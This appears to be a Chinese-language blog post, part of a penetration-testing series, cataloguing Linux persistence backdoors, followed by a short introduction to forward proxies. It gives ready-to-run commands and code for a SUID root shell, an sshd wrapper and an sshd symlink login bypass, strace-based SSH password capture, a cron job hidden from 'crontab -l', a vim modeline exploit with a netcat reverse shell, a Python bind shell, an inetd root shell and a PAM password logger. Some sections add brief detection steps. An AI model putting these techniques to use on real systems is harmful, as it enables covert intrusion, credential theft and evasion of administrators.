<h3 id="0x02-SUID后门"><a href="#0x02-SUID后门" class="headerlink" title="0x02 SUID后门"></a>0x02 SUID后门</h3><p>当一个文件所属主的x标志位s(set uid简称suid)时，且所属主为root时，当执行该文件时，其实是以root身份执行的。必要条件：</p>
<pre class="line-numbers language-undefined" data-language="undefined"><code class="language-undefined">Copy1、SUID权限仅对二进制程序有效。 
2、执行者对于该程序需要具有x的可执行权限
3、本权限仅在执行该程序的过程中有效  
4、在执行过程中执行者将具有该程序拥有者的权限<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>创建suid权限的文件：</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">Copy<span class="token variable">$cp</span> /bin/bash /tmp/.woot
<span class="token variable">$chmod</span> <span class="token number">4755</span> /tmp/.woot
<span class="token variable">$ls</span> -al /.woot
-rwsr-xr-x <span class="token number">1</span> root root <span class="token number">690668</span> Jul <span class="token number">24</span> <span class="token number">17</span>:14 .woot<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>使用一般用户运行：</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">Copy$/tmp/.woot 
$/tmp/.woot -p    //bash2 针对 suid 有一些护卫的措施，使用-p参数来获取一个root shell<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>检测：查找具有suid权限的文件即可</p>
<pre class="line-numbers language-typescript" data-language="typescript"><code class="language-typescript">Copyfind <span class="token operator">/</span> <span class="token operator">-</span>perm <span class="token operator">+</span><span class="token number">4000</span> <span class="token operator">-</span>ls
find <span class="token operator">/</span> <span class="token operator">-</span>perm <span class="token operator">-</span>u<span class="token operator">=</span>s <span class="token operator">-</span><span class="token keyword">type</span> <span class="token class-name">f</span> <span class="token number">2</span><span class="token operator">></span><span class="token operator">/</span>dev<span class="token operator">/</span><span class="token keyword">null</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h3 id="0x03-LKM-Linux-rootkit后门"><a href="#0x03-LKM-Linux-rootkit后门" class="headerlink" title="0x03 LKM Linux rootkit后门"></a>0x03 LKM Linux rootkit后门</h3><p>项目地址:<a target="_blank" rel="noopener" href="https://github.com/f0rb1dd3n/Reptile">https://github.com/f0rb1dd3n/Reptile</a></p>
<p>适用的系统:</p>
<pre class="line-numbers language-delphi" data-language="delphi"><code class="language-delphi">CopyDebian 9：4.9.0-8-amd64 
Debian 10：4.19.0-8-amd64 
Ubuntu 18.04.1 LTS：4.15.0-38-generic 
Kali Linux：4.18.0-kali2-amd64 
Centos 6.10：2.6.32- 754.6.3.el6.x86_64 
Centos 7：3.10.0-862.3.2.el7.x86_64 
Centos 8：4.18.0-147.5.1.el8_1.x86_64<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="0x04-SSH-后门"><a href="#0x04-SSH-后门" class="headerlink" title="0x04 SSH 后门"></a>0x04 SSH 后门</h3><h4 id="4-1-SSH-wrapper"><a href="#4-1-SSH-wrapper" class="headerlink" title="4.1 SSH wrapper"></a>4.1 SSH wrapper</h4><p>判断连接来源端口，将恶意端口来源访问传输内容重定向到&#x2F;bin&#x2F;sh中:</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Copycd /usr/sbin/
<span class="token function">mv</span> sshd <span class="token punctuation">..</span>/bin/

<span class="token builtin class-name">echo</span> <span class="token string">'#!/usr/bin/perl'</span> <span class="token operator">></span>sshd
<span class="token builtin class-name">echo</span> <span class="token string">'exec "/bin/sh" if(getpeername(STDIN) =~ /^..4A/);'</span> <span class="token operator">>></span>sshd   //4A是13377的小端模式
<span class="token builtin class-name">echo</span> <span class="token string">'exec&#123;"/usr/bin/sshd"&#125; "/usr/sbin/sshd",@ARGV,'</span> <span class="token operator">>></span>sshd
<span class="token function">chmod</span> u+x sshd

/etc/init.d/sshd restart<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在本机执行:</p>
<pre class="line-numbers language-css" data-language="css"><code class="language-css">Copysocat STDIO <span class="token property">TCP4</span><span class="token punctuation">:</span><span class="token property">target_ip</span><span class="token punctuation">:</span>22<span class="token punctuation">,</span>sourceport=13377<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1561366-20200306165200237-492698024.png"></p>
<p>实现原理：init 首先启动的是 &#x2F;usr&#x2F;sbin&#x2F;sshd ,脚本执行到 getpeername  这里的时候，正则匹配会失败，于是执行下一句，启动 &#x2F;usr&#x2F;bin&#x2F;sshd ，这是原始 sshd 。原始的 sshd 监听端口建立了 tcp  连接后，会 fork 一个子进程处理具体工作。这个子进程，没有什么检验，而是直接执行系统默认的位置的 &#x2F;usr&#x2F;sbin&#x2F;sshd  ，这样子控制权又回到脚本了。此时子进程标准输入输出已被重定向到套接字， getpeername 能真的获取到客户端的 TCP 源端口，如果是  13377 就执行sh给个shell。</p>
<p>想要修改连接端口的话可以利用py修改：</p>
<pre class="line-numbers language-go" data-language="go"><code class="language-go">Copyimport <span class="token keyword">struct</span>
buffer <span class="token operator">=</span> <span class="token keyword">struct</span><span class="token punctuation">.</span><span class="token function">pack</span><span class="token punctuation">(</span><span class="token string">'>I6'</span><span class="token punctuation">,</span><span class="token number">19526</span><span class="token punctuation">)</span>
<span class="token builtin">print</span> <span class="token function">repr</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1561366-20200305165647857-2116649151.png"></p>
<p>优点：<br> 1、在无连接后门的情况下，管理员是看不到端口和进程的，last也查不到登陆。<br> 2、在针对边界设备出网，内网linux服务器未出网的情况下，留这个后门可以随时管理内网linux服务器，还不会留下文件和恶意网络连接记录。</p>
<h4 id="4-2-SSH-软连接后门"><a href="#4-2-SSH-软连接后门" class="headerlink" title="4.2 SSH 软连接后门"></a>4.2 SSH 软连接后门</h4><p>软连接后门的原理是利用了PAM配置文件的作用，将sshd文件软连接名称设置为su，这样应用在启动过程中他会去PAM配置文件夹中寻找是否存在对应名称的配置信息(su)，然而 su 在 pam_rootok 只检测 uid 0 即可认证成功，这样就导致了可以使用任意密码登录:</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Copyln -sf /usr/sbin/sshd /tmp/su
/tmp/su -oPort<span class="token operator">=</span><span class="token number">888</span>

<span class="token function">ssh</span> root@127.0.0.1 -p <span class="token number">888</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1561366-20200305205754698-1274201580.png"></p>
<p>优点：能够绕过一些网络设备的安全流量监测，但是本地在查看监听端口时会暴露端口，建议设置成8081，8080等端口。</p>
<h4 id="4-3-SSH-公钥免密登陆"><a href="#4-3-SSH-公钥免密登陆" class="headerlink" title="4.3 SSH 公钥免密登陆"></a>4.3 SSH 公钥免密登陆</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Copyssh-keygen -t rsa //生成公钥
<span class="token builtin class-name">echo</span> id_rsa.pub <span class="token operator">>></span> .ssh/authorized_keys  //将id_rsa.pub内容放到目标.ssh/authorized_keys里<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>这个是老生常谈的公钥免登陆，这种用法不只是用在留后门，还可以在一些特殊情况下获取一个交互的shell，如struts写入公钥，oracle写入公钥连接，Redis未授权访问等情景。</p>
<h4 id="4-4-SSH-Keylogger记录密码"><a href="#4-4-SSH-Keylogger记录密码" class="headerlink" title="4.4 SSH Keylogger记录密码"></a>4.4 SSH Keylogger记录密码</h4><p>当前系统如果存在strace的话，它可以跟踪任何进程的系统调用和数据，可以利用 strace 系统调试工具获取 ssh 的读写连接的数据，以达到抓取管理员登陆其他机器的明文密码的作用。</p>
<p>在当前用户的 .bashrc 里新建一条 alias ，这样可以抓取他登陆其他机器的 ssh 密码</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Copyalias <span class="token assign-left variable">ssh</span><span class="token operator">=</span><span class="token string">'strace -o /tmp/.sshpwd-`date '</span>+%d%h%m%s<span class="token string">'`.log -e read,write,connect -s2048 ssh'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>设置完毕后，倘若当前系统不存在alias，那么就会影响其正常使用：</p>
<p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1561366-20200305210445202-153632745.png"></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Copygrep <span class="token string">"read(5"</span> /tmp/.sshpwd-09May32324242.log <span class="token operator">|</span> <span class="token function">tail</span> -n <span class="token number">11</span>    //根据不同环境自行调试响应行数<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1561366-20200305211117157-1374708307.png"></p>
<h4 id="4-5-strace监听ssh来源流量"><a href="#4-5-strace监听ssh来源流量" class="headerlink" title="4.5 strace监听ssh来源流量"></a>4.5 strace监听ssh来源流量</h4><p>不只是可以监听连接他人，还可以用来抓到别人连入的密码。应用场景如：通过漏洞获取root权限，但是不知道明文密码在横向扩展中可以使用。</p>
<p>之前有用别名的方式来抓取登陆其他机器时的密码、同样也可以利用strace来监听登陆本地的sshd流量。</p>
<pre class="line-numbers language-perl" data-language="perl"><code class="language-perl">Copyps <span class="token operator">-</span>ef <span class="token operator">|</span> grep sshd    <span class="token operator">//</span>父进程PID
strace <span class="token operator">-f</span> <span class="token operator">-p</span> <span class="token number">4241</span> <span class="token operator">-o</span> <span class="token regex">/tmp/</span><span class="token operator">.</span>ssh<span class="token operator">.</span>log <span class="token operator">-e</span> trace<span class="token operator">=</span>read<span class="token punctuation">,</span>write<span class="token punctuation">,</span>connect <span class="token operator">-s</span> <span class="token number">2048</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1561366-20200305211719699-1558610383.png"></p>
<p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1561366-20200305212145796-1257295497.png"></p>
<p>检测：查看shell的配置文件或者 alias 命令即可发现，例如 ~&#x2F;.bashrc 或 ~&#x2F;.zshrc 文件查看是否有恶意的 alias</p>
<h3 id="0x05-Cron后门"><a href="#0x05-Cron后门" class="headerlink" title="0x05 Cron后门"></a>0x05 Cron后门</h3><p>在Linux系统中，计划任务一般是由cron承担，我们可以把cron设置为开机时自动启动。cron启动后，它会读取它的所有配置文件（全局性配置文件&#x2F;etc&#x2F;crontab，以及每个用户的计划任务配置文件），然后cron会根据命令和执行时间来按时来调用工作任务。</p>
<p>cron表达式在线生成：<a target="_blank" rel="noopener" href="http://qqe2.com/cron">http://qqe2.com/cron</a></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Copy<span class="token punctuation">(</span>crontab -l<span class="token punctuation">;</span><span class="token builtin class-name">echo</span> <span class="token string">'*/1 * * * * /bin/bash /tmp/1.elf;/bin/bash --noprofile -i'</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token function">crontab</span> -<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1561366-20200305213650119-595237820.png"></p>
<p>这样执行会在crontab列表里出现，如果是如上执行的话，管理员执行crontab -l就能看到执行的命令内容不是特别隐蔽。</p>
<p>那么就有了一个相对的高级用法，下面命令执行后会显示”no crontab for root”。其实就达到了一个隐藏的效果，这时候管理员如果执行 crontab -l 就会看到显示”no crontab for root”:</p>
<pre class="line-numbers language-perl" data-language="perl"><code class="language-perl">Copy<span class="token punctuation">(</span>crontab <span class="token operator">-l</span><span class="token punctuation">;</span>printf <span class="token string">"*/1 * * * * /bin/bash /tmp/1.elf;/bin/bash --noprofile -i;\rno crontab for `whoami`%100c\n"</span><span class="token punctuation">)</span><span class="token operator">|</span>crontab <span class="token operator">-</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1561366-20200305214230870-387789665.png"></p>
<p>实际上是他将 cron 文件写到文件中,而 crontab -l 就是列出了该文件的内容:</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Copy/var/spool/cron/crontabs/root<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>通常 cat 是看不到这个的，只能利用 less、vim 或者 cat -A 看到，这也是利用了cat的一个缺陷，在下一节会主要讲这个。</p>
<p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1561366-20200305214447271-1226946787.png"></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Copy<span class="token comment">#这几个路径都可以存放cron执行脚本,对应的时间不同</span>
/etc/cron.d/ /etc/cron.daily/ /etc/cron.weekly/ /etc/cron.hourly/ /etc/cron.monthly/ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h3 id="0x06-Cat隐藏"><a href="#0x06-Cat隐藏" class="headerlink" title="0x06 Cat隐藏"></a>0x06 Cat隐藏</h3><p>刚刚在cron里面提到了cat的一个缺陷，可以利用这个缺陷隐藏恶意命令在一些脚本中：这里的示例我就用 hiding-from-cats  里的例子吧。之所以单列出来，个人认为在一些大型企业的运维工具脚本中可以插入恶意代码，利用cat的缺陷还可以使管理员无法发现脚本被做手脚。</p>
<p>cat其实默认使用是支持一些比如 \r 回车符 \n 换行符 \f 换页符、也就是这些符号导致的能够隐藏命令。</p>
<p>使用python生成带有换行符的内容sh：</p>
<pre class="line-numbers language-lua" data-language="lua"><code class="language-lua">Copycmd_h <span class="token operator">=</span> <span class="token string">"echo 'You forgot to check `cat -A`!' > oops"</span> <span class="token operator">#</span> hidden
cmd_v <span class="token operator">=</span> <span class="token string">"echo 'Hello world!'"</span>                         <span class="token operator">#</span> visible

with <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"test.sh"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span> as f<span class="token punctuation">:</span>
output <span class="token operator">=</span> <span class="token string">"#!/bin/sh\n"</span>
output <span class="token operator">+</span><span class="token operator">=</span> cmd_h <span class="token operator">+</span> <span class="token string">";"</span> <span class="token operator">+</span> cmd_v <span class="token operator">+</span> <span class="token string">" #\r"</span> <span class="token operator">+</span> cmd_v <span class="token operator">+</span> <span class="token string">" "</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token function">len</span><span class="token punctuation">(</span>cmd_h<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\n"</span>
f<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>使用 py 生成了一个 test.sh 脚本，同目录下只有他本文件，cat查看一下：</p>
<p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1561366-20200305220616509-925341340.png"></p>
<p>执行一下test.sh：</p>
<p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1561366-20200305220738695-372605639.png"></p>
<p>cat -A 再次查看一下：</p>
<p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1561366-20200305220835294-1217326615.png"></p>
<p>其实可以看出来这样就做到了恶意命令隐藏的效果。其实之前 Cron 后门中的隐藏方法就是利用了这个。如果使用 cat -A 查看root文件的话就可以看到计划任务的真正内容了。</p>
<h3 id="0x07-Vim后门"><a href="#0x07-Vim后门" class="headerlink" title="0x07 Vim后门"></a>0x07 Vim后门</h3><h4 id="vim-modeline-CVE-2019-12735"><a href="#vim-modeline-CVE-2019-12735" class="headerlink" title="vim modeline(CVE-2019-12735)"></a>vim modeline(CVE-2019-12735)</h4><p>该漏洞存在于编辑器的 modeline功能，部分 Linux 发行版默认启用了该功能，macOS 是没有默认启用。 当 vim  打开一个包含了 vim modeline 注释行的文件时，会自动读取这一行的参数配置并调整自己的设置到这个配置。vim默认关闭modeline。</p>
<p>开启命令：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Copyvim ~/.vimrc
<span class="token builtin class-name">set</span> modeline<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>当前目录下创建文件：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Copyecho <span class="token string">':!uname -a||" vi:fen:fdm=expr:fde=assert_fails("source\!\ \%"):fdl=0:fdt="'</span> <span class="token operator">></span> hello.txt
<span class="token function">vim</span> hello.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1561366-20200306165831251-1080934852.png"></p>
<p>反弹shell：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Copy:<span class="token operator">!</span>rm /tmp/f<span class="token punctuation">;</span><span class="token function">mkfifo</span> /tmp/f<span class="token punctuation">;</span><span class="token function">cat</span> /tmp/f<span class="token operator">|</span>/bin/sh -i <span class="token operator"><span class="token file-descriptor important">2</span>></span><span class="token file-descriptor important">&amp;1</span><span class="token operator">|</span><span class="token function">nc</span> <span class="token number">127.0</span>.0.1 <span class="token number">9999</span> <span class="token operator">></span>/tmp/f<span class="token operator">||</span><span class="token string">" vi:fen:fdm=expr:fde=assert_fails("</span>source<span class="token punctuation">\</span><span class="token operator">!</span><span class="token punctuation">\</span> <span class="token punctuation">\</span>%<span class="token string">"):fdl=0:fdt="</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h4 id="vim-python-扩展后门"><a href="#vim-python-扩展后门" class="headerlink" title="vim python 扩展后门"></a>vim python 扩展后门</h4><p>适用于安装了vim且安装了python扩展(绝大版本默认安装)的linux系统。</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Copycd /usr/lib/python2.7/site-packages <span class="token operator">&amp;&amp;</span> <span class="token variable"><span class="token variable">$(</span><span class="token function">nohup</span> <span class="token function">vim</span> -E -c <span class="token string">"pyfile dir.py"</span><span class="token operator">></span> /dev/null <span class="token operator"><span class="token file-descriptor important">2</span>></span><span class="token file-descriptor important">&amp;1</span> <span class="token operator">&amp;</span><span class="token variable">)</span></span> <span class="token operator">&amp;&amp;</span> <span class="token function">sleep</span> <span class="token number">2</span> <span class="token operator">&amp;&amp;</span> <span class="token function">rm</span> -f dir.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>恶意脚本 dir.py 的内容可以是任何功能的后门，比如监听本地的11端口：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">Copy<span class="token comment">#from https://www.leavesongs.com/PYTHON/python-shell-backdoor.html</span>
<span class="token keyword">from</span> socket <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> subprocess
<span class="token keyword">import</span> os<span class="token punctuation">,</span> threading<span class="token punctuation">,</span> sys<span class="token punctuation">,</span> time
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
       server<span class="token operator">=</span>socket<span class="token punctuation">(</span>AF_INET<span class="token punctuation">,</span>SOCK_STREAM<span class="token punctuation">)</span>
       server<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
       server<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>
       <span class="token keyword">print</span> <span class="token string">'waiting for connect'</span>
       talk<span class="token punctuation">,</span> addr <span class="token operator">=</span> server<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span>
       <span class="token keyword">print</span> <span class="token string">'connect from'</span><span class="token punctuation">,</span>addr
       proc <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>Popen<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span><span class="token string">"-i"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> stdin<span class="token operator">=</span>talk<span class="token punctuation">,</span>
               stdout<span class="token operator">=</span>talk<span class="token punctuation">,</span> stderr<span class="token operator">=</span>talk<span class="token punctuation">,</span> shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>攻击机nc连接过去就可以了:</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Copynohup <span class="token function">vim</span> -E -c <span class="token string">"pyfile dir.py"</span>
<span class="token function">nc</span> <span class="token number">127.0</span>.0.1 <span class="token number">11</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h3 id="0x08-inetd服务后门"><a href="#0x08-inetd服务后门" class="headerlink" title="0x08 inetd服务后门"></a>0x08 inetd服务后门</h3><p>inetd是一个监听外部网络请求(就是一个socket)的系统守护进程，默认情况下为13端口。当inetd接收到一个外部请求后，它会根据这个请求到自己的配置文件中去找到实际处理它的程序，然后再把接收到的这个socket交给那个程序去处理。所以，如果我们已经在目标系统的inetd配置文件中配置好，那么来自外部的某个socket是要执行一个可交互的shell，就获取了一个后门。</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Copy<span class="token comment">#修改/etc/inetd.conf</span>
<span class="token variable">$vim</span> /etc/inetd.conf

<span class="token comment">#discard stream tcp nowait root internal </span>
<span class="token comment">#discard dgram udp wait root internal </span>
daytime stream tcp nowait root /bin/bash <span class="token function">bash</span> -i

<span class="token comment">#开启inetd</span>
<span class="token variable">$inetd</span>

<span class="token comment">#nc连接</span>
<span class="token function">nc</span> -vv <span class="token number">192.168</span>.2.11 <span class="token number">13</span>
Copy<span class="token comment">#可以配合suid后门，修改/etc/services文件：</span>
suidshell <span class="token number">6666</span>/tcp
<span class="token comment">#然后修改/etc/inetd.conf</span>
suidshell stream tcp nowait root /bin/bash <span class="token function">bash</span> -i
<span class="token comment">#可以修改成一些常见的端口，以实现隐藏</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>检测：查看配置文件即可</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Copycat /etc/inetd.conf <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="0x09-协议后门"><a href="#0x09-协议后门" class="headerlink" title="0x09 协议后门"></a>0x09 协议后门</h3><p>在一些访问控制做的比较严格的环境中，由内到外的TCP流量会被阻断掉。但是对于UDP(DNS、ICMP)相关流量通常不会拦截。</p>
<h4 id="ICMP"><a href="#ICMP" class="headerlink" title="ICMP"></a>ICMP</h4><p>主要原理就是利用ICMP中可控的data字段进行数据传输，具体原理请参考: <a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/41154036">https://zhuanlan.zhihu.com/p/41154036</a></p>
<p>开源工具：ICMP后门项目地址：<a target="_blank" rel="noopener" href="https://github.com/andreafabrizi/prism">https://github.com/andreafabrizi/prism</a></p>
<h4 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h4><p>在大多数的网络里环境中IPS&#x2F;IDS或者硬件防火墙都不会监控和过滤DNS流量。主要原理就是将后门载荷隐藏在拥有PTR记录和A记录的DNS域中（也可以利用AAAA记录和IPv6地址传输后门），具体请参考：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/85431">通过DNS传输后门来绕过杀软</a></p>
<p>开源工具：DNS后门项目地址：<a target="_blank" rel="noopener" href="https://github.com/DamonMohammadbagher/NativePayload_DNS">https://github.com/DamonMohammadbagher/NativePayload_DNS</a></p>
<p>协议后门检测：对于DNS&#x2F;ICMP这种协议后门，直接查看网络连接即可，因为在使用过程中会产生大量的网络连接</p>
<p>清除：kill进程、删除文件即可</p>
<h3 id="0x10-PAM后门"><a href="#0x10-PAM后门" class="headerlink" title="0x10 PAM后门"></a>0x10 PAM后门</h3><p>PAM使用配置 &#x2F;etc&#x2F;pam.d&#x2F; 下的文件来管理认证方式，应用程序调用相应的配置文件，以加载动态库的形式调用 &#x2F;lib&#x2F;security下的模块。</p>
<p>PAM配置可分为四个参数: 模块类型、控制标记、模块路径、模块参数，例如: session required pam_selinux.so open</p>
<p>上面提到的 sshd 软链接后门利用的 PAM 机制达到任意密码登录，还有一种方式是键盘记录。原理主要是通过 pam_unix_auth.c 打补丁的方式潜入到正常的 pam 模块中，以此来记录管理员的帐号密码。</p>
<p>利用步骤：复制patch到源代码目录 &gt;&gt;&gt; 打patch &gt;&gt;&gt; 编译 &gt;&gt;&gt;  将生成的pam_uninx.so文件覆盖到&#x2F;lib&#x2F;secruity&#x2F;pam_unix.so下 &gt;&gt;&gt; 修改文件属性  &gt;&gt;&gt; 建立密码保存文件，并设置好相关的权限 &gt;&gt;&gt; 清理日志 &gt;&gt;&gt; ok</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Copy<span class="token comment">#确保ssh开启pam支持</span>
<span class="token function">vim</span> /etc/ssh/sshd_config
UsePAM <span class="token function">yes</span>

<span class="token comment">#自动化脚本</span>
https://github.com/litsand/shell/blob/master/pam.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>检测：</p>
<pre class="line-numbers language-perl" data-language="perl"><code class="language-perl">Copy1、通过Strace跟踪ssh
ps axu <span class="token operator">|</span> grep sshd
strace <span class="token operator">-o</span> aa <span class="token operator">-</span>ff <span class="token operator">-p</span> PID
grep open aa<span class="token operator">*</span> <span class="token operator">|</span> grep <span class="token operator">-</span>v <span class="token operator">-e</span> No <span class="token operator">-e</span> null <span class="token operator">-e</span> denied<span class="token operator">|</span> grep WR

<span class="token number">2</span>、检查pam_unix<span class="token operator">.</span>so的修改时间
stat <span class="token operator">/</span>lib<span class="token operator">/</span>security<span class="token operator">/</span>pam_unix<span class="token operator">.</span>so      <span class="token comment">#32位</span>
stat <span class="token operator">/</span>lib64<span class="token operator">/</span>security<span class="token operator">/</span>pam_unix<span class="token operator">.</span>so    <span class="token comment">#64位</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>清除：yum reinstall pam</p>
<h3 id="0x10-进程注入"><a href="#0x10-进程注入" class="headerlink" title="0x10 进程注入"></a>0x10 进程注入</h3><p>从技术上说，获取其它的进程并修改它一般是通过操作系统提供的调试接口来实现的，在 linux 中具有调试功能的工具有  ptrace、Gdb、radare2、strace 等，这些工具都是使用 ptrace 这个系统调用来提供服务的。ptrace  系统调用允许一个进程去调试另外一个进程。</p>
<p>GitHub存在大量开源工具，比如: linux-inject，主要原理是使用 ptrace 向进程中注入恶意 so 文件</p>
<pre class="line-numbers language-delphi" data-language="delphi"><code class="language-delphi">Copy$.&#x2F;inject [-n process-name] [-p pid] [library-to-inject]
.&#x2F;inject -n sample-target sample-library.so<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>清除：kill或者重启对应的进程即可</p>
<p>还有 cymothoa ：<a target="_blank" rel="noopener" href="https://github.com/jorik041/cymothoa">https://github.com/jorik041/cymothoa</a></p>
<h3 id="0x11-Rootkit"><a href="#0x11-Rootkit" class="headerlink" title="0x11 Rootkit"></a>0x11 Rootkit</h3><p>rootkit分为内核级和应用级两种:内核级的比如：Diamorphine，应用级的比如：Mafix</p>
<p>Mafix 是一款常用的轻量应用级别Rootkits，是通过伪造ssh协议漏洞实现远程登陆的特点是配置简单并可以自定义验证密码和端口号。应用级rookit，主要替换ls、ps、netstat命令来隐藏文件</p>
<p>检测：使用相关检测工具，比如：unhide</p>
<h2 id="12-内网代理正向与反向"><a href="#12-内网代理正向与反向" class="headerlink" title="12.内网代理正向与反向"></a>12.内网代理正向与反向</h2><h3 id="一-什么是代理"><a href="#一-什么是代理" class="headerlink" title="一 什么是代理"></a>一 什么是代理</h3><p>代理其实就是一个中介，A和B本来可以直连，中间插入一个C，C就是中介。<br>刚开始的时候，代理多数是帮助内网client访问外网server用的<br>后来出现了反向代理，”反向”这个词在这儿的意思其实是指方向相反，即代理将来自外网客户端的请求转发到内网服务器，从外到内</p>
<h3 id="二-正向代理"><a href="#二-正向代理" class="headerlink" title="二 正向代理"></a>二 正向代理</h3><p>正向代理类似一个跳板机，代理访问外部资源</p>
<p>比如我们国内访问谷歌，直接访问访问不到，我们可以通过一个正向代理服务器，请求发到代理服，代理服务器能够访问谷歌，这样由代理去谷歌取到返回数据，再返回给我们，这样我们就能访问谷歌了</p>
<p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220402195952165.png"></p>
<p><strong>正向代理的用途：</strong></p>
<p>　　（1）访问原来无法访问的资源，如google</p>
<p>​    （2） 可以做缓存，加速访问资源</p>
<p>　　（3）对客户端访问授权，上网进行认证</p>
<p>　　（4）代理可以记录用户访问记录（上网行为管理），对外隐藏用户信息</p>
